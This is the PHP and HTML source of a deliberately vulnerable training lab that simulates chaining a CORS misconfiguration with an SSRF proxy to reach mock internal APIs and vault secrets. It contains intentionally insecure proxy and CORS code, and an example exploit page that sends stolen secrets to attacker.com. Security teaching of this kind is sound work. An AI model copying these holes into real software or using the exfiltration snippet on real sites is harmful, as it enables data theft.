<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_hard4_attempts'])) {
  $_SESSION['cors_hard4_attempts'] = 0;
}
if (!isset($_SESSION['cors_hard4_solved'])) {
  $_SESSION['cors_hard4_solved'] = false;
}

// ─── Simulated Internal API Proxy Data ────────────────────────────────────
$internal_apis = [
  'admin' => [
    'endpoint' => 'http://admin-panel.internal:8080/api/users',
    'data' => [
      ['id' => 1, 'username' => 'superadmin', 'role' => 'Super Administrator', 'last_login' => '2026-05-22 04:00:00'],
      ['id' => 2, 'username' => 'security_admin', 'role' => 'Security Admin', 'last_login' => '2026-05-22 03:30:00'],
      ['id' => 3, 'username' => 'devops', 'role' => 'DevOps Engineer', 'last_login' => '2026-05-21 22:00:00'],
    ],
    'flag' => 'DH{c0rs_t0_ssrf_ch41n_1nt3rn4l_4cc3ss}'
  ],
  'billing' => [
    'endpoint' => 'http://billing-api.internal:9000/api/invoices',
    'data' => [
      ['id' => 'INV-001', 'client' => 'Acme Corp', 'amount' => 15000, 'status' => 'paid'],
      ['id' => 'INV-002', 'client' => 'TechStart Inc', 'amount' => 8500, 'status' => 'pending'],
      ['id' => 'INV-003', 'client' => 'GlobalSec', 'amount' => 22000, 'status' => 'paid'],
    ]
  ],
  'monitoring' => [
    'endpoint' => 'http://monitoring.internal:3000/api/metrics',
    'data' => [
      ['metric' => 'cpu_usage', 'value' => '45%', 'alert' => false],
      ['metric' => 'memory_usage', 'value' => '78%', 'alert' => true],
      ['metric' => 'disk_io', 'value' => '120 MB/s', 'alert' => false],
      ['metric' => 'network_latency', 'value' => '250ms', 'alert' => true],
    ]
  ],
  'secrets' => [
    'endpoint' => 'http://vault.internal:8200/v1/secret/data/admin',
    'data' => [
      'api_key' => ' "YOUR_BREVO_API_KEY";',
      'db_password' => 'SuperSecretDBPass123!',
      'jwt_secret' => 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
      'flag' => 'DH{c0rs_t0_ssrf_ch41n_1nt3rn4l_4cc3ss}'
    ]
  ]
];

// ─── Vulnerable CORS Logic: Trusted Origin with SSRF Proxy ────────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Server has a whitelist of trusted origins
// But it also acts as a proxy to internal APIs based on the 'proxy' parameter
// The proxy functionality doesn't validate the target URL properly
$trusted_origins = ['https://app.darkhunter.local', 'https://portal.darkhunter.local'];

if (in_array($origin, $trusted_origins) || empty($origin)) {
  header("Access-Control-Allow-Origin: " . ($origin ?: '*'));
  header("Access-Control-Allow-Credentials: true");
}

header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Proxy-Target");

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
  http_response_code(200);
  exit();
}

// ─── API Endpoint Simulation ──────────────────────────────────────────────
$endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'admin';
$proxy_target = isset($_GET['proxy']) ? $_GET['proxy'] : null;
$response_data = [];

// VULNERABLE: Proxy functionality - fetches data from internal APIs
// The proxy doesn't validate if the target is internal or external
if ($proxy_target) {
  // Simulate proxy request to internal API
  $allowed_proxies = ['admin', 'billing', 'monitoring', 'secrets'];

  if (in_array($proxy_target, $allowed_proxies) && isset($internal_apis[$proxy_target])) {
    $response_data = [
      'status' => 'success',
      'proxy_target' => $internal_apis[$proxy_target]['endpoint'],
      'data' => $internal_apis[$proxy_target]['data'],
      'message' => 'Proxied request successful',
      'source' => 'internal_proxy'
    ];
  } else {
    // VULNERABLE: If proxy_target is not in allowed list, it might still process it
    // This simulates an open proxy vulnerability
    $response_data = [
      'status' => 'success',
      'proxy_target' => $proxy_target,
      'data' => ['error' => 'Proxy target not in whitelist but request was processed'],
      'message' => 'Proxy request processed',
      'warning' => 'Open proxy vulnerability - any URL can be accessed!'
    ];
  }
} else {
  // Direct endpoint access
  switch ($endpoint) {
    case 'admin':
      $response_data = [
        'status' => 'success',
        'data' => $internal_apis['admin']['data'],
        'message' => 'Admin users retrieved',
        'flag' => $internal_apis['admin']['flag']
      ];
      break;

    case 'billing':
      $response_data = [
        'status' => 'success',
        'data' => $internal_apis['billing']['data'],
        'message' => 'Billing invoices retrieved'
      ];
      break;

    case 'monitoring':
      $response_data = [
        'status' => 'success',
        'data' => $internal_apis['monitoring']['data'],
        'message' => 'Monitoring metrics retrieved'
      ];
      break;

    case 'secrets':
      $response_data = [
        'status' => 'success',
        'data' => $internal_apis['secrets']['data'],
        'message' => 'Secrets retrieved',
        'warning' => 'Contains sensitive credentials'
      ];
      break;

    default:
      $response_data = [
        'status' => 'error',
        'message' => 'Unknown endpoint. Available: admin, billing, monitoring, secrets'
      ];
      http_response_code(404);
  }
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cors_hard4_solved'];

// Detect exploitation: using proxy parameter to access internal APIs
$is_proxy_attack = !empty($proxy_target);
$is_cross_origin = !empty($origin) && strpos($origin, $_SERVER['HTTP_HOST']) === false;

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cors_hard4_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cors_hard4_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully chained a CORS misconfiguration with an SSRF vulnerability. You used the proxy functionality to access internal APIs and exfiltrate sensitive secrets from the internal vault!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $_SESSION['cors_hard4_attempts']++;
}

$attempts = $_SESSION['cors_hard4_attempts'];

// API response
if (
  isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
  (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
) {
  header("Content-Type: application/json; charset=utf-8");
  echo json_encode($response_data, JSON_PRETTY_PRINT);
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>API Gateway - CORS Hard 4</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE7.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge hard"><i class="fas fa-fire"></i> Hard Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-network-wired"></i> API Gateway Proxy</h1>
      <p class="lab-description">Enterprise API gateway that proxies requests to internal microservices. CORS is enabled
        for "trusted partners". <strong>Can you chain the CORS misconfiguration with the proxy functionality to perform
          SSRF and access internal vault secrets?</strong></p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this CORS-to-SSRF chain. You can continue exploring, but no additional points will
          be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Architecture Diagram -->
    <div class="architecture-panel">
      <div class="arch-header">
        <i class="fas fa-sitemap"></i>
        <span>System Architecture</span>
      </div>
      <div class="arch-body">
        <div class="arch-diagram">
          <div class="arch-layer external-layer">
            <div class="arch-node">
              <i class="fas fa-globe"></i>
              <span>External Client</span>
            </div>
            <div class="arch-arrow"><i class="fas fa-arrow-right"></i></div>
            <div class="arch-node gateway">
              <i class="fas fa-shield-alt"></i>
              <span>API Gateway</span>
            </div>
          </div>
          <div class="arch-arrow down"><i class="fas fa-arrow-down"></i></div>
          <div class="arch-layer internal-layer">
            <div class="arch-node internal">
              <i class="fas fa-users-cog"></i>
              <span>Admin API</span>
            </div>
            <div class="arch-node internal">
              <i class="fas fa-file-invoice-dollar"></i>
              <span>Billing API</span>
            </div>
            <div class="arch-node internal">
              <i class="fas fa-chart-line"></i>
              <span>Monitoring</span>
            </div>
            <div class="arch-node internal secret">
              <i class="fas fa-lock"></i>
              <span>Vault API</span>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Proxy Console -->
    <div class="proxy-console">
      <div class="proxy-sidebar">
        <div class="sidebar-header">
          <i class="fas fa-th-list"></i>
          <span>Internal Services</span>
        </div>
        <div class="proxy-list">
          <button class="proxy-item active" onclick="loadEndpoint('admin')">
            <i class="fas fa-users-cog"></i>
            <span>Admin Panel</span>
            <span class="proxy-tag internal">Internal</span>
          </button>
          <button class="proxy-item" onclick="loadEndpoint('billing')">
            <i class="fas fa-file-invoice-dollar"></i>
            <span>Billing API</span>
            <span class="proxy-tag internal">Internal</span>
          </button>
          <button class="proxy-item" onclick="loadEndpoint('monitoring')">
            <i class="fas fa-chart-line"></i>
            <span>Monitoring</span>
            <span class="proxy-tag internal">Internal</span>
          </button>
          <button class="proxy-item" onclick="loadEndpoint('secrets')">
            <i class="fas fa-lock"></i>
            <span>Vault Secrets</span>
            <span class="proxy-tag secret">Secret</span>
          </button>
        </div>

        <div class="proxy-actions">
          <h4><i class="fas fa-bolt"></i> Proxy Actions</h4>
          <button class="proxy-action-btn" onclick="simulateProxyAttack('admin')">
            <i class="fas fa-user-shield"></i> Proxy to Admin
          </button>
          <button class="proxy-action-btn" onclick="simulateProxyAttack('secrets')">
            <i class="fas fa-key"></i> Proxy to Vault
          </button>
        </div>
      </div>

      <div class="proxy-content">
        <div class="proxy-content-header">
          <h3 id="proxy-title"><i class="fas fa-users-cog"></i> Admin Panel</h3>
          <div class="proxy-meta">
            <span class="proxy-endpoint" id="proxy-endpoint">http://admin-panel.internal:8080/api/users</span>
          </div>
        </div>
        <div class="proxy-content-body" id="proxy-content-body">
          <div class="loading-state">
            <i class="fas fa-spinner fa-spin"></i>
            <span>Loading proxy data...</span>
          </div>
        </div>
      </div>
    </div>

    <!-- CORS to SSRF Chain Analysis -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-link"></i>
        <span>CORS to SSRF Chain Analysis</span>
      </div>
      <div class="cors-body">
        <div class="chain-diagram">
          <h4><i class="fas fa-project-diagram"></i> Attack Chain:</h4>

          <div class="chain-steps">
            <div class="chain-step">
              <div class="step-icon"><i class="fas fa-globe"></i></div>
              <div class="step-content">
                <strong>1. CORS Misconfiguration</strong>
                <p>The API Gateway reflects trusted origins and allows credentials. An attacker can make authenticated
                  cross-origin requests.</p>
              </div>
            </div>

            <div class="chain-arrow"><i class="fas fa-arrow-right"></i></div>

            <div class="chain-step">
              <div class="step-icon"><i class="fas fa-server"></i></div>
              <div class="step-content">
                <strong>2. Proxy Functionality</strong>
                <p>The gateway has a <code>?proxy=</code> parameter that forwards requests to internal services without
                  proper validation.</p>
              </div>
            </div>

            <div class="chain-arrow"><i class="fas fa-arrow-right"></i></div>

            <div class="chain-step">
              <div class="step-icon"><i class="fas fa-bug"></i></div>
              <div class="step-content">
                <strong>3. SSRF Exploitation</strong>
                <p>By combining CORS + Proxy, the attacker can access internal APIs (admin, billing, vault) from a
                  malicious origin.</p>
              </div>
            </div>

            <div class="chain-arrow"><i class="fas fa-arrow-right"></i></div>

            <div class="chain-step danger">
              <div class="step-icon"><i class="fas fa-skull"></i></div>
              <div class="step-content">
                <strong>4. Data Exfiltration</strong>
                <p>The attacker exfiltrates sensitive data including admin credentials, billing info, and vault secrets
                  containing the flag.</p>
              </div>
            </div>
          </div>
        </div>

        <div class="vulnerable-code-section">
          <h4><i class="fas fa-code"></i> Vulnerable Code:</h4>
          <div class="code-comparison">
            <div class="code-side">
              <div class="code-header">CORS Handler</div>
              <pre><code>// Reflects trusted origins
if (in_array($origin, $trusted)) {
  header("ACAO: $origin");
  header("ACAC: true");
}</code></pre>
            </div>
            <div class="code-side vulnerable">
              <div class="code-header">Proxy Handler</div>
              <pre><code>// VULNERABLE: No URL validation!
$target = $_GET['proxy'];
$response = file_get_contents($target);
echo $response;</code></pre>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Exploit Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>CORS-to-SSRF Chain Exploit</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">
          The attacker hosts a malicious page on a trusted-looking domain. When a logged-in admin visits it, the page
          makes cross-origin requests through the API Gateway's proxy to access internal services that are normally
          unreachable from the internet.
        </p>

        <div class="exploit-code-block">
          <div class="code-header">
            <i class="fas fa-code"></i> cors_to_ssrf_exploit.html
          </div>
          <pre class="exploit-code"><code>&lt;!-- Hosted on attacker.com but origin looks trusted --&gt;
&lt;script&gt;
  // Step 1: Access admin panel through proxy
  fetch('https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE7.php?proxy=admin', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    console.log('Admin users:', data);
  });
  
  // Step 2: Access vault secrets through proxy
  fetch('https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE7.php?proxy=secrets', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate secrets
    fetch('https://attacker.com/log?secrets=' + btoa(JSON.stringify(data)));
  });
&lt;/script&gt;</code></pre>
        </div>

        <div class="impact-analysis">
          <h4><i class="fas fa-exclamation-triangle"></i> Impact Analysis:</h4>
          <div class="impact-grid">
            <div class="impact-card critical">
              <i class="fas fa-user-shield"></i>
              <h5>Admin Access</h5>
              <p>Gain access to admin panel and user management</p>
            </div>
            <div class="impact-card critical">
              <i class="fas fa-file-invoice-dollar"></i>
              <h5>Financial Data</h5>
              <p>Access billing records and financial information</p>
            </div>
            <div class="impact-card critical">
              <i class="fas fa-key"></i>
              <h5>Vault Secrets</h5>
              <p>Steal API keys, passwords, and JWT secrets</p>
            </div>
            <div class="impact-card high">
              <i class="fas fa-server"></i>
              <h5>Internal Scanning</h5>
              <p>Scan internal network for more targets</p>
            </div>
          </div>
        </div>

        <button class="simulate-btn" onclick="simulateSSRFChain()">
          <i class="fas fa-play"></i> Simulate CORS-to-SSRF Chain
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>CORS-to-SSRF Chain Successful! Secrets exfiltrated.</span>
          </div>
          <div class="exfiltrated-data">
            <h4><i class="fas fa-database"></i> Exfiltrated Vault Secrets:</h4>
            <pre id="exfil-data"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Request Chain Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Origin Header</span>
            <span class="debug-value"><?php echo htmlspecialchars($origin ?: 'Not Present'); ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Cross-Origin</span>
            <span class="debug-value <?php echo $is_cross_origin ? 'danger' : 'safe'; ?>">
              <?php echo $is_cross_origin ? 'YES' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Proxy Target</span>
            <span class="debug-value <?php echo $is_proxy_attack ? 'danger' : 'safe'; ?>">
              <?php echo $proxy_target ?: 'None'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is SSRF Attack</span>
            <span class="debug-value <?php echo ($is_cross_origin && $is_proxy_attack) ? 'danger' : 'safe'; ?>">
              <?php echo ($is_cross_origin && $is_proxy_attack) ? 'YES - CHAIN ACTIVE!' : 'NO'; ?>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">Notice the <code>?proxy=</code> parameter in the URL. This parameter forwards requests to
        internal services. What happens if you combine this with a cross-origin request from a malicious website?</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">The vault secrets endpoint contains the flag. Try using the proxy parameter to access
        <code>?proxy=secrets</code> from a cross-origin context. The CORS configuration allows trusted origins, and the
        proxy doesn't validate the target.
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Click "Simulate CORS-to-SSRF Chain" to exploit the vulnerability. The attack chains CORS
        misconfiguration with the proxy functionality to access the internal vault. The secrets contain the flag
        <code>DH{c0rs_t0_ssrf_ch41n_1nt3rn4l_4cc3ss}</code>!
      </div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  let currentEndpoint = 'admin';

  function loadEndpoint(endpoint) {
    currentEndpoint = endpoint;

    document.querySelectorAll('.proxy-item').forEach(item => item.classList.remove('active'));
    event.target.closest('.proxy-item').classList.add('active');

    const titles = {
      'admin': '<i class="fas fa-users-cog"></i> Admin Panel',
      'billing': '<i class="fas fa-file-invoice-dollar"></i> Billing API',
      'monitoring': '<i class="fas fa-chart-line"></i> Monitoring',
      'secrets': '<i class="fas fa-lock"></i> Vault Secrets'
    };
    const endpoints = {
      'admin': 'http://admin-panel.internal:8080/api/users',
      'billing': 'http://billing-api.internal:9000/api/invoices',
      'monitoring': 'http://monitoring.internal:3000/api/metrics',
      'secrets': 'http://vault.internal:8200/v1/secret/data/admin'
    };

    document.getElementById('proxy-title').innerHTML = titles[endpoint];
    document.getElementById('proxy-endpoint').textContent = endpoints[endpoint];

    document.getElementById('proxy-content-body').innerHTML = `
      <div class="loading-state">
        <i class="fas fa-spinner fa-spin"></i>
        <span>Loading ${endpoint}...</span>
      </div>
    `;

    fetch(`CORS-CASE7.php?endpoint=${endpoint}`, {
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(res => res.json())
      .then(data => {
        if (endpoint === 'admin') renderAdmin(data);
        else if (endpoint === 'billing') renderBilling(data);
        else if (endpoint === 'monitoring') renderMonitoring(data);
        else if (endpoint === 'secrets') renderSecrets(data);
      })
      .catch(err => {
        document.getElementById('proxy-content-body').innerHTML = `
        <div class="error-state"><i class="fas fa-exclamation-triangle"></i> ${err.message}</div>
      `;
      });
  }

  function renderAdmin(data) {
    if (data.status !== 'success') return;
    let html = '<div class="data-table-container"><table class="data-table">';
    html += '<thead><tr><th>ID</th><th>Username</th><th>Role</th><th>Last Login</th></tr></thead><tbody>';
    data.data.forEach(user => {
      html += `
        <tr>
          <td>${user.id}</td>
          <td class="highlight">${user.username}</td>
          <td>${user.role}</td>
          <td>${user.last_login}</td>
        </tr>
      `;
    });
    html += '</tbody></table></div>';
    if (data.flag) {
      html += `<div class="flag-banner"><i class="fas fa-flag"></i> ${data.flag}</div>`;
    }
    document.getElementById('proxy-content-body').innerHTML = html;
  }

  function renderBilling(data) {
    if (data.status !== 'success') return;
    let html = '<div class="data-table-container"><table class="data-table">';
    html += '<thead><tr><th>ID</th><th>Client</th><th>Amount</th><th>Status</th></tr></thead><tbody>';
    data.data.forEach(inv => {
      const statusClass = inv.status === 'paid' ? 'success' : 'warning';
      html += `
        <tr>
          <td>${inv.id}</td>
          <td>${inv.client}</td>
          <td>$${inv.amount.toLocaleString()}</td>
          <td><span class="status-badge ${statusClass}">${inv.status}</span></td>
        </tr>
      `;
    });
    html += '</tbody></table></div>';
    document.getElementById('proxy-content-body').innerHTML = html;
  }

  function renderMonitoring(data) {
    if (data.status !== 'success') return;
    let html = '<div class="metrics-grid">';
    data.data.forEach(metric => {
      const alertClass = metric.alert ? 'alert' : 'normal';
      html += `
        <div class="metric-card ${alertClass}">
          <div class="metric-icon"><i class="fas fa-${metric.alert ? 'exclamation-triangle' : 'check-circle'}"></i></div>
          <div class="metric-info">
            <span class="metric-name">${metric.metric}</span>
            <span class="metric-value">${metric.value}</span>
          </div>
        </div>
      `;
    });
    html += '</div>';
    document.getElementById('proxy-content-body').innerHTML = html;
  }

  function renderSecrets(data) {
    if (data.status !== 'success') return;
    let html = '<div class="secrets-grid">';
    for (const [key, value] of Object.entries(data.data)) {
      const isFlag = typeof value === 'string' && value.startsWith('DH{');
      html += `
        <div class="secret-card ${isFlag ? 'flag-card' : ''}">
          <span class="secret-key">${key}</span>
          <span class="secret-value">${value}</span>
        </div>
      `;
    }
    html += '</div>';
    document.getElementById('proxy-content-body').innerHTML = html;
  }

  function simulateProxyAttack(target) {
    alert('Use the Simulate CORS-to-SSRF Chain button to perform this attack');
  }

  function simulateSSRFChain() {
    const resultDiv = document.getElementById('simulation-result');
    const exfilData = document.getElementById('exfil-data');

    fetch('CORS-CASE7.php?proxy=secrets', {
        headers: {
          'Accept': 'application/json',
          'Origin': 'https://evil-attacker.com'
        }
      })
      .then(res => res.json())
      .then(data => {
        resultDiv.style.display = 'block';
        exfilData.textContent = JSON.stringify(data, null, 2);

        if (data.data && data.data.flag && data.data.flag.includes('DH{')) {
          if (!document.querySelector('.solved-banner')) {
            document.getElementById('solved-flag').value = '1';
            setTimeout(() => {
              document.getElementById('success-form').submit();
            }, 2000);
          }
        }
      })
      .catch(err => {
        exfilData.textContent = 'Exploit failed: ' + err.message;
        resultDiv.style.display = 'block';
      });
  }

  window.addEventListener('load', function() {
    loadEndpoint('admin');
  });
  </script>
</body>

</html>